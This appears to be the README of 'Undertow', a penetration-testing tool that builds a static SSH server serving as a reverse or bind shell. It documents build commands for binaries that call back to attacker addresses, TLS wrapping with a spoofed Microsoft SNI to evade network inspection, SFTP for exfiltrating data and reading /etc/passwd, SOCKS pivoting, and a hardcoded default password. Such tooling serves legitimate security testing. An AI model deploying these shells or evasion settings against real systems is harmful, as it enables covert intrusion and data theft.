<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="assets/banner.svg">
  <source media="(prefers-color-scheme: light)" srcset="assets/banner.svg">
  <img alt="Undertow" src="assets/banner.svg" width="800">
</picture>

<br>

**Statically-linked SSH server for penetration testing and CTF challenges**

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](LICENSE)
[![Go](https://img.shields.io/badge/Go-1.15%2B-00ADD8.svg)](https://go.dev)
[![Platforms](https://img.shields.io/badge/Platforms-Linux%20%7C%20Windows-brightgreen.svg)](#platform-notes)

<br>

Undertow provides reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding — all in a single static binary under 1.5MB. Optional TLS wrapping hides SSH inside HTTPS to evade DPI/IDS on the wire.

</div>

<br>

## Table of Contents

- [Highlights](#highlights)
- [Quick Start](#quick-start)
- [Build Options](#build-options)
- [Usage](#usage)
- [TLS Wrapping](#tls-wrapping)
- [SSH Features](#ssh-features)
- [Architecture](#architecture)
- [Authentication](#authentication)
- [Platform Notes](#platform-notes)
- [Advanced: Direct Make](#advanced-direct-make)
- [Runtime Flags](#runtime-flags)

---

## Highlights

<table>
<tr>
<td width="50%">

### Interactive Shell
Full PTY support with Ctrl+C, tab completion, and command history. Linux uses `creack/pty`, Windows 10+ uses ConPTY. No more fighting with raw netcat shells.

</td>
<td width="50%">

### Reverse & Bind Modes
Reverse mode dials home through firewalls. Bind mode listens on target. Both support the same SSH feature set — PTY, SFTP, and port forwarding work identically in either mode.

</td>
</tr>
<tr>
<td width="50%">

### SFTP File Transfer
Built-in SFTP subsystem for drag-and-drop file transfer. Upload tools, download loot, exfiltrate data — all through the same SSH connection. No need for a separate transfer channel.

</td>
<td width="50%">

### Port Forwarding
Local, remote, and dynamic (SOCKS) port forwarding. Pivot through the target to reach internal networks, expose services, or tunnel traffic through a compromised host.

</td>
</tr>
<tr>
<td width="50%">

### TLS Wrapping
Optional `--tls` flag wraps SSH inside TLS with ALPN negotiation and SNI spoofing. On the wire it looks like HTTPS — the SSH banner never appears in plaintext. Configurable SNI hostname for blending.

</td>
<td width="50%">

### Single Static Binary
Cross-compiled with `CGO_ENABLED=0` for zero dependencies. Under 1.5MB for Linux, works on Windows and Linux x86/x64. Deploy by dropping a single file — no runtime, no libraries, no installer.

</td>
</tr>
<tr>
<td width="50%">

### Handler Scripts
Build script auto-generates a handler that starts the listener, displays credentials, and shows the SSH command when a callback arrives. One command to be ready for connections.

</td>
<td width="50%">

### Catppuccin Mocha Theme
All build output uses the [Catppuccin Mocha](https://catppuccin.com/palette) color palette — status indicators, build configuration, engagement checklists. Because your terminal should look good.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

| Requirement | Version |
|-------------|---------|
| Go | >= 1.15 |
| Make | Any |
| UPX | Optional (for `--compress`) |

### Build & Deploy

```bash
# Reverse shell — connects back to your machine
./build.sh reverse 192.168.1.10:4444

# Start the handler (displays SSH command when callback arrives)
./bin/handler-192-168-1-10-4444
```

```bash
# Bind shell — listens on target
./build.sh listen 8888

# Connect from attacker
ssh -p 8888 svc@TARGET_IP
```

```bash
# TLS-wrapped reverse shell on port 443
./build.sh reverse 10.10.14.5:443 --tls

# TLS bind shell
./build.sh listen 443 --tls
```

---

## Build Options

```
Usage: ./build.sh <mode> <target> [options]

Modes:
    reverse <IP:PORT>       Build binary that auto-connects to IP:PORT
    reverse <IP> <PORT>     Build binary that auto-connects to IP on PORT
    listen <PORT>           Build binary that listens on PORT
```

### Options

| Option | Default | Description |
|--------|---------|-------------|
| `-u, --user` | `svc` | Username for reverse connections |
| `-b, --bind-port` | `0` | Port to access shell on attacker (`0` = random) |
| `-p, --password` | auto | Custom password |
| `-k, --pubkey` | none | ED25519 public key file |
| `-s, --shell` | `/bin/bash` | Shell to spawn |
| `-c, --compress` | off | Compress with UPX |
| `--tls` | off | Wrap SSH inside TLS (looks like HTTPS) |
| `--sni HOSTNAME` | `www.microsoft.com` | SNI hostname for TLS ClientHello |
| `--nocli` | off | Hardcoded binary (no runtime flags) |
| `--dry-run` | off | Preview build without executing |
| `--show-password` | off | Always display password after build |

### Examples

```bash
# Custom user and random bind port
./build.sh reverse 10.10.14.5:443 --user kali --bind-port 0

# With password and compression
./build.sh reverse 192.168.1.10:22 --password "secret" --compress

# TLS with custom SNI
./build.sh reverse 10.10.14.5:443 --tls --sni update.windows.com

# Minimal hardcoded bind shell
./build.sh listen 4444 --shell /bin/sh --nocli

# Public key auth
./build.sh reverse 10.0.0.1:4444 --pubkey ~/.ssh/id_ed25519.pub

# IPv6 (use brackets and quotes)
./build.sh reverse '[::1]:4444'

# Preview without building
./build.sh reverse 10.10.14.5:443 --tls --dry-run
```

### Output

Binaries go to `bin/` with descriptive names:

```
bin/
├── undertow-192-168-1-10-4444-linux-x64
├── undertow-192-168-1-10-4444-linux-x86
├── undertow-192-168-1-10-4444-windows-x64.exe
├── undertow-192-168-1-10-4444-windows-x86.exe
└── handler-192-168-1-10-4444       ← Run this on your attack machine
```

---

## Usage

### Reverse Shell

**Attacker:**
```bash
./build.sh reverse YOUR_IP:4444
./bin/handler-YOUR_IP-4444
```

**Target:**
```bash
./undertow-YOUR_IP-4444-linux-x64
```

**Connect:** Handler shows the SSH command when callback arrives.

### Bind Shell

**Target:**
```bash
./undertow-listen-8888-linux-x64
```

**Attacker:**
```bash
ssh -p 8888 svc@TARGET_IP
```

---

## TLS Wrapping

SSH traffic is identifiable on the wire via the plaintext `SSH-2.0-*` banner. The `--tls` flag wraps SSH inside TLS, making the outer layer look like HTTPS to DPI/IDS.

```
Without TLS:   Target ──SSH──→ Attacker:443     (DPI sees SSH banner)
With TLS:      Target ──TLS(SSH)──→ Attacker:443  (DPI sees HTTPS)
```

```bash
# Reverse shell over TLS on port 443
./build.sh reverse 10.10.14.5:443 --tls

# Custom SNI hostname (default: www.microsoft.com)
./build.sh reverse 10.10.14.5:443 --tls --sni update.windows.com

# Bind shell with TLS
./build.sh listen 443 --tls
```

| Feature | Detail |
|---------|--------|
| **Certificate** | Fresh ECDSA P-256 self-signed cert generated at runtime (no files on disk) |
| **ALPN** | Negotiates `h2` / `http/1.1` matching real HTTPS traffic |
| **SNI** | Configurable hostname in ClientHello (default: `www.microsoft.com`) |
| **SAN** | Certificate SAN matches the SNI hostname |
| **Both modes** | Works identically in reverse and listen modes |
| **Transparent** | All SSH features (PTY, SFTP, port forwarding) work unmodified inside the tunnel |

### Connecting to a TLS-Wrapped Listener

Your SSH client needs a TLS tunnel. Use `openssl s_client` or `ncat --ssl` as a proxy:

```bash
ssh -o ProxyCommand='openssl s_client -quiet -connect %h:%p -servername www.microsoft.com' -p 443 svc@TARGET
```

---

## SSH Features

### File Transfer

```bash
sftp -P 8888 svc@127.0.0.1

# One-liner
echo "get /etc/passwd" | sftp -P 8888 svc@127.0.0.1
```

### Port Forwarding

```bash
# Local: access target's internal services
ssh -p 8888 -L 8080:internal:80 svc@127.0.0.1

# Remote: expose your services to target
ssh -p 8888 -R 9999:localhost:80 svc@127.0.0.1

# Dynamic: SOCKS proxy through target
ssh -p 8888 -D 9050 svc@127.0.0.1
```

---

## Architecture

~800 lines of Go across 6 source files:

```
undertow/
├── main.go                 # Entry point, SSH server setup, compile-time variables
├── core.go                 # Auth handlers, port forwarding, dialHomeAndListen(), SFTP,
│                           #   TLS cert generation, ExtraInfo channel
├── ssh_session.go          # Session dispatcher for PTY/command/forwarding-only requests
├── ssh_session_unix.go     # Unix PTY via creack/pty (build tag: !windows)
├── ssh_session_windows.go  # Windows ConPTY / ssh-shellhost fallback (build tag: windows)
├── build.sh                # Build wrapper with Catppuccin Mocha output
├── Makefile                # Cross-compilation targets
├── go.mod                  # Dependencies
└── assets/
    ├── id_undertow         # Default SSH keypair
    └── id_undertow.pub
```

### Key Patterns

| Pattern | Description |
|---------|-------------|
| **Handler factories** | `createPasswordHandler()`, `createPublicKeyHandler()`, `createSFTPHandler()`, etc. |
| **Build tags** | `//go:build windows` and `//go:build !windows` for platform-specific code |
| **Static compilation** | `CGO_ENABLED=0` with `-ldflags="-s -w"` |
| **Custom SSH channel** | `"rs-info"` exchanges `ExtraInfo` struct (CurrentUser, Hostname, ListeningAddress) |
| **TLS wrapping** | `generateSelfSignedCert()` for listen mode, `tls.Client()` for reverse mode |
| **Timing-safe auth** | `subtle.ConstantTimeCompare()` for password verification |

### Dependencies

| Library | Purpose |
|---------|---------|
| `github.com/gliderlabs/ssh` | SSH server |
| `github.com/pkg/sftp` | SFTP subsystem |
| `github.com/creack/pty` | Unix PTY allocation |
| `github.com/ActiveState/termtest/conpty` | Windows ConPTY |
| `golang.org/x/crypto/ssh` | SSH client (reverse connections) |
| `golang.org/x/term` | Password input |

---

## Authentication

| Method | Detail |
|--------|--------|
| **Password** | Default: `letmeinbrudipls` (or auto-generated at build time) |
| **Public key** | ED25519, enabled when `--pubkey` is provided |
| **Username** | Default: `svc` |
| **SSH key** | [assets/id_undertow](assets/id_undertow) |

```bash
# Custom credentials
./build.sh reverse IP:PORT --password "MyPass"
./build.sh reverse IP:PORT --pubkey ~/.ssh/id_ed25519.pub
```

---

## Platform Notes

| Platform | Support |
|----------|---------|
| Linux (kernel 2.6.23+) | Full PTY |
| Windows 10 Build 17763+ | Full ConPTY |
| Older Windows | Append `cmd` to SSH, or use `--shell ssh-shellhost.exe` |

---

## Advanced: Direct Make

For cross-compilation or fine-grained control:

```bash
# With variables
LHOST="192.168.1.10" LPORT="443" TLS_WRAP=1 RS_PASS="secret" make

# Cross-compile
GOARCH=arm64 GOOS=linux make
```

| Variable | Default | Description |
|----------|---------|-------------|
| `LHOST` | empty | Target host (enables reverse mode) |
| `LPORT` | `31337` | SSH port |
| `BPORT` | `0` | Bind port (`0` = random, needs OpenSSH 6.0+) |
| `LUSER` | `svc` | Username |
| `RS_PASS` | random | Password |
| `RS_PUB` | empty | Authorized public key |
| `RS_SHELL` | `/bin/bash` | Default shell |
| `NOCLI` | empty | Set to disable CLI |
| `TLS_WRAP` | empty | Set to enable TLS wrapping |
| `TLS_SNI` | `www.microsoft.com` | SNI hostname for TLS ClientHello |

---

## Runtime Flags

When CLI is enabled, the binary accepts:

| Flag | Default | Description |
|------|---------|-------------|
| `-l` | off | Listen mode (bind shell) |
| `-p` | `31337` | Port |
| `-b` | `0` | Bind port after reverse |
| `-s` | `/bin/bash` | Shell |
| `-N` | off | Port forwarding only |
| `-v` | off | Verbose |

### SSH Config

Add to `~/.ssh/config`:

```
Host target
    Hostname 127.0.0.1
    Port 8888
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
```

Then: `ssh target`

---

<div align="center">

**Built for offense. Tested in labs.**

[GitHub](https://github.com/Fahrj/reverse-ssh) | [License (GPLv3)](LICENSE) | [Report Issue](https://github.com/Fahrj/reverse-ssh/issues)

*Undertow — SSH where it shouldn't be*

</div>
